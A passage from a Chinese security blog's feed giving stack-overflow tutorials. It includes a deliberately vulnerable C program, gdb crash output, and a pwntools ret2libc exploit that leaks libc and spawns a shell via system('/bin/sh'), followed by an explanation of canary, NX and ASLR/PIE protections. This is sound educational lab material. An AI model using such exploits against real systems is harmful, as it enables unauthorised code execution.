src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/23.png" alt="image-20201121164703334"></p><blockquote><h2 id="绕过ASLR保护"><a href="#绕过ASLR保护" class="headerlink" title="绕过ASLR保护"></a>绕过ASLR保护</h2></blockquote><p>测试代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -z noexecstack -no-pie test.c -o test.out</span></span><br></pre></td></tr></table></figure><p>首先检查题目的保护和是否开启了ASLR保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7f71000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7da0000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f73000)</span><br><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7fba000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7de9000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure><p>运行的时候查看下加载了什么动态链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0xf7fd9860  0xf7ff28dd  Yes (*)     /lib/ld-linux.so.2</span><br><span class="line">0xf7e1d750  0xf7f4696d  Yes (*)     /lib32/libc.so.6</span><br></pre></td></tr></table></figure><p>题目的思路：由于程序未开启PIE，导致程序本身的地址是固定的，我们可以通过write()函数进行信息泄露，打印出libc的地址，进而计算system()的地址</p><p>EXP就分为两个流程：</p><ul><li>通过payload在vuln_func中进行栈溢出，调用write@plt 打印出write@got，完成后又返回到vuln_func中</li><li>通过再次溢出调用计算出相对地址的system函数获得shell</li></ul><p>首先查看溢出位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  pattern create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: &#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn&#x2F;test.out </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xc9 </span><br><span class="line">EBX: 0x6c414150 (&#39;PAAl&#39;)</span><br><span class="line">ECX: 0xffffcd80 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EBP: 0x41514141 (&#39;AAQA&#39;)</span><br><span class="line">ESP: 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">EIP: 0x41416d41 (&#39;AmAA&#39;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41416d41</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0004| 0xffffce14 (&quot;AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0008| 0xffffce18 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0012| 0xffffce1c (&quot;TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0016| 0xffffce20 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0020| 0xffffce24 (&quot;ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0024| 0xffffce28 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0028| 0xffffce2c (&quot;AAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41416d41 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br></pre></td></tr></table></figure><div class="note info modern"><p>1.由于和题目ret2libc3不一样，溢出函数不是在main()中而是在vuln_func_addr()中，所以我们只需要获取vuln_func_addr()函数的地址来作为返回地址</p><p>2.要利用什么函数就需要根据函数的具体参数来构造栈，比如利用<code>write(STDOUT_FILENO, &quot;Hello world!\n&quot;, 13)</code>，那么我们栈的构造就需要<code>write(1,address,4)</code>来传递参数</p></div><p>编写EXP，运行环境Ubuntu 16.04 Python3.8 （Ubuntu20.04 Python3.8无法运行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coidng: utf-8 -*-</span></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_func_addr = elf.symbols[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span> * <span class="number">140</span>).encode()+ p32(write_plt)+p32(vuln_func_addr)+p32(<span class="number">1</span> )+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#&quot;A&quot; * 140是溢出需要的字节</span></span><br><span class="line"><span class="comment">#write(1,address,4)表示将address向外写</span></span><br><span class="line">print(payload1)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/26.png" alt="image-20210325200443317"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;c90530c910b0</span><br><span class="line">https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2019&#x2F;03&#x2F;05&#x2F;%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc</span><br><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x01）</title>
    <link href="https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/</id>
    <published>2020-11-19T10:45:42.000Z</published>
    <updated>2021-05-17T02:09:49.634Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>记录下自己学习堆栈溢出的内容，这篇就是栈溢出入门的东西，也算是栈溢出总结的上篇，缝合怪文章大部分都是参考各个师傅的文章，后面还会有堆溢出。写文章的初心是为了总结梳理下自己的学习过程。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/1.gif" alt="74CBF97F98866D946732450F281B1AD0"></p><blockquote><h3 id="栈溢出利用方式"><a href="#栈溢出利用方式" class="headerlink" title="栈溢出利用方式"></a>栈溢出利用方式</h3></blockquote><ul><li>ROP（修改返回地址，让其指向内存中已有的一段指令<ul><li>ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令</li><li>ret2libc（修改返回地址，让其指向内存中已有的某个函数</li><li>BROP</li><li>ret2dl-resolve</li><li>SROP</li></ul></li></ul><blockquote><h3 id="常用保护机制"><a href="#常用保护机制" class="headerlink" title="常用保护机制"></a>常用保护机制</h3></blockquote><h4 id="CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护"></a><strong>CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护</strong></h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                       <span class="comment">#默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c     <span class="comment">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c <span class="comment">#启用堆栈保护，为所有函数插入保护代码</span></span><br></pre></td></tr></table></figure><hr><h4 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY/轻微的检查"></a><strong>FORTIFY/轻微的检查</strong></h4><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                        <span class="comment">#默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c    <span class="comment">#较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c    <span class="comment">#较强的检查</span></span><br></pre></td></tr></table></figure><hr><h4 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>工作原理如图：<br><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/2.png" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                <span class="comment">#默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c   <span class="comment">#禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c <span class="comment">#开启NX保护</span></span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><hr><h4 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h4><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p><strong>如果只开启ASLR的话，本身二进制程序是不支持随机化加载的，所以就出现了ret2plt、GOT表劫持、地址爆破等</strong></p><p>内存地址随机化机制（address space layout randomization)，有以下四种情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br><span class="line">2+PIE - 全部随机化</span><br></pre></td></tr></table></figure><table><thead><tr><th>ASLR</th><th>Executable</th><th>PLT</th><th>Heap</th><th>Stack</th><th>Shared libraries</th></tr></thead><tbody><tr><td>0</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td></tr><tr><td>1</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2+PIE</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr></tbody></table><p>使用一个程序来演示下上表的内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">int</span> *heap = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system@plt: %p\n&quot;</span>, &amp;system);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>, heap);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>, &amp;<span class="built_in">stack</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(heap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc test.c -no-pie -fno-pie -ldl</span></span><br></pre></td></tr></table></figure><h5 id="未开启ASLR和PIE"><a href="#未开启ASLR和PIE" class="headerlink" title="未开启ASLR和PIE"></a>未开启ASLR和PIE</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br></pre></td></tr></table></figure><p>可以看到所有的地址都不变</p><h5 id="开启ALSR未开启PIE"><a href="#开启ALSR未开启PIE" class="headerlink" title="开启ALSR未开启PIE"></a>开启ALSR未开启PIE</h5><h6 id="部分开启时"><a href="#部分开启时" class="headerlink" title="部分开启时"></a>部分开启时</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffdde37ce04</span><br><span class="line">libc: 0x7f8ef1525500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffcd375c374</span><br><span class="line">libc: 0x7f51c11fb500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>的地址和<strong>libc</strong>的地址发生了改变</p><h6 id="完全开启时"><a href="#完全开启时" class="headerlink" title="完全开启时"></a>完全开启时</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x15162a0</span><br><span class="line">stack: 0x7ffda4f34384</span><br><span class="line">libc: 0x7f615589b500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x5a22a0</span><br><span class="line">stack: 0x7ffe432fa664</span><br><span class="line">libc: 0x7f17a059f500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>、<strong>libc</strong>、<strong>堆</strong>的地址发生了改变，但是程序本身的<strong>PLT</strong>不变</p><h5 id="开启ALSR和PIE"><a href="#开启ALSR和PIE" class="headerlink" title="开启ALSR和PIE"></a>开启ALSR和PIE</h5><p>GCC支持的PIE选项如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fpic          <span class="comment">#为共享库生成位置无关代码</span></span><br><span class="line">-pie           <span class="comment">#生成动态链接的位置无关可执行文件，通常需要同时指定-fpie</span></span><br><span class="line">-no-pie        <span class="comment">#不生成动态链接的位置无关可执行文件</span></span><br><span class="line">-fpie          <span class="comment">#类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie</span></span><br><span class="line">-fno-pie       <span class="comment">#不生成位置无关代码</span></span><br></pre></td></tr></table></figure><p>通过<code>-pie -fpie</code>进行编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# gcc -pie -fpie test.c -ldl</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x5640b79d01c9</span><br><span class="line">system@plt: 0x7fa5361ca410</span><br><span class="line">heap: 0x5640b8a392a0</span><br><span class="line">stack: 0x7ffc036cac64</span><br><span class="line">libc: 0x7fa53636d500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x561760ad81c9</span><br><span class="line">system@plt: 0x7f509abd0410</span><br><span class="line">heap: 0x561760be32a0</span><br><span class="line">stack: 0x7ffe2f8a7694</span><br><span class="line">libc: 0x7f509ad73500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# 